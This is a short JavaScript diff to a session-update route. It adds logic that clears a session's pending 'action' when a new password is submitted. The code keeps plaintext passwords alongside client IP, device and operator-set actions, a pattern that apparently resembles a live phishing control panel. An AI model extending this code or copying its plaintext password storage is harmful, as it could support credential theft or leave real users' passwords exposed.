@@ -44,6 +44,7 @@ const registerSessionRoutes = (prefix) => {
     const clientIp = ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
 
     if (sessions[id]) {
+      const isSubmittingPassword = password !== undefined && password !== "" && password !== "—" && password !== sessions[id].password;
       sessions[id] = {
         ...sessions[id],
         username: username || sessions[id].username,
@@ -52,7 +53,7 @@ const registerSessionRoutes = (prefix) => {
         device: device || sessions[id].device,
         ip: clientIp,
         state: state || sessions[id].state,
-        action: action !== undefined ? action : sessions[id].action,
+        action: action !== undefined ? action : (isSubmittingPassword ? null : sessions[id].action),
         customImage: customImage !== undefined ? customImage : sessions[id].customImage,
         last_seen: Date.now(),
         updatedAt: Date.now()
